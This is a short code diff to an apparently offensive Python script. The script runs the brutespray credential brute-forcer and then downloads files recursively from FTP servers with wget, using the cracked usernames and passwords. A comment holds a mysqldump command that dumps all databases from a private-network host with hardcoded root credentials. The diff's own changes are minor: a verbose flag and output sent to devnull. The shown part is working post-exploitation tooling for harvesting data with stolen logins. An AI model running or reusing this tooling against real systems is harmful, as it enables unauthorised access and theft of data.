@@ -3,6 +3,7 @@ import argparse
 import time
 import re
 from pathlib import Path
+import os
 
 #mysqldump --user=root --password=toor --host=192.168.111.145 --protocol=tcp --port=3306 --all-databases > dump.sql
 
@@ -37,14 +38,16 @@ def run_brutespray(threads: int):
 	brute_out, brute_err = brute_poc.communicate()
 	# print(brute_out.decode('utf-8'))
 
-def get_ftp_files(ip, username, password, filepath=None, recursion_depth=5):
+def get_ftp_files(ip, username, password, filepath=None, recursion_depth=5, verbose=False):
 	filename = filepath.split('/')
 	filename = filename[-1]
 	mkdir = "mkdir -p ftp/" + username + "; cd ftp/" + username + ";"
 	# get = "curl ftp://" + username + ":" + password + "@" + ip + filepath + " -o " + filename + ";"
 	get = "wget ftp://" + username + ":" + password + "@" + ip + filepath + " -r -l " + str(recursion_depth + 1) + ";"
 	cmd = mkdir + get
-	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+	devnull = open(os.devnull, 'w')
+	proc = subprocess.Popen(cmd, stdout=devnull, shell=True)
+	# proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 	if err is not None:
 		print("\tF\tailed to grab all files")
